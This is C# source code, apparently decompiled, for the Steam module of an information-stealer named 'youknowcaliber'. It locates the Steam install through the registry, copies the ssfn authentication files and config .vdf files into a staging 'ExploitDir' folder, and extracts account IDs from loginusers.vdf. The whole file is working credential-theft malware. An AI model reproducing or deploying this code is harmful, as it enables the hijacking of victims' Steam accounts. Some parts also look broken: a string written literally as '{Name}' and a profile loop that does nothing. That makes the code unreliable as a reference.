﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace youknowcaliber
{
	internal class Steam
	{
		public static void SteamGet()
		{
			try
			{
				string text = Help.ExploitDir + "\\Gaming\\Steam";
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Steam.SteamPath_x32);
				string text2 = registryKey.GetValue("SteamPath").ToString();
				bool flag = !Directory.Exists(text2);
				if (!flag)
				{
					bool flag2 = Steam.GetLocationSteam("InstallPath", "SourceModInstallPath") == null;
					if (!flag2)
					{
						bool flag3 = Steam.GetAllProfiles() == null;
						if (!flag3)
						{
							Directory.CreateDirectory(text);
							foreach (string contents in Steam.GetAllProfiles())
							{
								File.AppendAllText(text + "\\AccountsList.txt", contents);
							}
							foreach (string str in registryKey.OpenSubKey("Apps").GetSubKeyNames())
							{
								using (RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + str))
								{
									string text3 = (string)registryKey2.GetValue("Name");
									string text4 = string.IsNullOrEmpty(text3) ? "Unknown" : text3;
									File.AppendAllText(text + "\\Games.txt", "{Name}\n");
								}
							}
							bool flag4 = Directory.Exists(text2);
							if (flag4)
							{
								Directory.CreateDirectory(text + "\\ssnf");
								foreach (string text5 in Directory.GetFiles(text2))
								{
									bool flag5 = text5.Contains("ssfn");
									if (flag5)
									{
										File.Copy(text5, text + "\\ssnf\\" + Path.GetFileName(text5));
									}
								}
							}
							string path = Path.Combine(text2, "config");
							bool flag6 = Directory.Exists(path);
							if (flag6)
							{
								Directory.CreateDirectory(text + "\\configs");
								foreach (string text6 in Directory.GetFiles(path))
								{
									bool flag7 = text6.EndsWith("vdf");
									if (flag7)
									{
										File.Copy(text6, text + "\\configs\\" + Path.GetFileName(text6));
									}
								}
							}
							Counting.Steam++;
						}
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		public static string GetLocationSteam(string Inst = "InstallPath", string Source = "SourceModInstallPath")
		{
			string result;
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(Steam.SteamPath_x64, Environment.Is64BitOperatingSystem ? Steam.True : Steam.False))
					{
						using (RegistryKey registryKey3 = registryKey.OpenSubKey(Steam.SteamPath_x32, Environment.Is64BitOperatingSystem ? Steam.True : Steam.False))
						{
							object obj;
							if (registryKey2 == null)
							{
								obj = null;
							}
							else
							{
								object value = registryKey2.GetValue(Inst);
								obj = ((value != null) ? value.ToString() : null);
							}
							object obj2;
							if ((obj2 = obj) == null)
							{
								if (registryKey3 == null)
								{
									obj2 = null;
								}
								else
								{
									object value2 = registryKey3.GetValue(Source);
									obj2 = ((value2 != null) ? value2.ToString() : null);
								}
							}
							result = obj2;
						}
					}
				}
			}
			catch (Exception value3)
			{
				Console.WriteLine(value3);
				result = null;
			}
			return result;
		}

		public static List<string> GetAllProfiles()
		{
			List<string> result;
			try
			{
				bool flag = !File.Exists(Steam.LoginFile);
				if (flag)
				{
					result = null;
				}
				else
				{
					string input = File.ReadAllText(Steam.LoginFile);
					List<string> list = (from Match x in Regex.Matches(input, "\\\"76(.*?)\\\"")
					select "76" + x.Groups[1].Value).ToList<string>();
					List<string> list2 = new List<string>();
					for (int i = 0; i < list.Count<string>(); i++)
					{
					}
					result = list2;
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = null;
			}
			return result;
		}

		private static readonly string SteamPath_x64 = "SOFTWARE\\Wow6432Node\\Valve\\Steam";

		public static readonly string SteamPath_x32 = "Software\\Valve\\Steam";

		private static readonly bool True = true;

		private static readonly bool False = false;

		private static readonly string LoginFile = Path.Combine(Steam.GetLocationSteam("InstallPath", "SourceModInstallPath"), "config\\loginusers.vdf");
	}
}
